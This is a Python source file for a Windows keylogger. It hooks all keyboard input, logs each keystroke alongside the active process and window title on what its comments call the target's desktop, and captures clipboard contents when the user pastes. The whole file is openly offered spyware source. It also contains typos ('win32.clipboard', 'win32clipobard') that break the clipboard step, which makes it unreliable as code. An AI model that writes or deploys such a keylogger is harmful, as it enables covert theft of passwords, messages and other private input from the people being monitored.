from ctypes import *
import pythoncom
import pyHook
import win32clipboard

user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None

def get_current_process():
    # Get a handle to the active window on the target's desktop
    hwnd = user32.GetForegroundWindow()

    # Find the process ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    # Store the current process ID
    process_id = "%d" % pid.value

    # Grab the executable
    executable = create_string_buffer("\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    # Find the executable name of the process
    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

    # Grab the full text of the windw's title bar 
    window_title = create_string_buffer("\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)

    # Print out the header if we are in the right process
    # This will show which keystrokes went with which process and windows
    print
    print "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)
    print

    # Close handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)

def KeyStroke(event):
    
    global current_window
    
    # Check if the user has changed window
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()

    # If they pressed a standard key
    if event.Ascii > 32 and event.Ascii < 127:
        print chr(event.Ascii)
    else:
        # If [CTRL-V], get the value on the clipboard
        if event.Key == "V":
            
            win32.clipboard.OpenClipboard()
            pasted_value = win32clipobard.GetClipboardData()
            win32clipboard.CloseClipboard()

            print "[PASTE] - %s" % (pasted_value)
        else:
            print "[%s]" % event.Key

    # Pass the execution to the next hook registered
    return True

# Create and register a PyHook HookManager
k1 = pyHook.HookManager()
# Bind the KeyDown event to our user-defined callback function KeyStroke
k1.KeyDown = KeyStroke

# Register the hook and execute forever
k1.HookKeyboard()
pythoncom.PumpMessages()

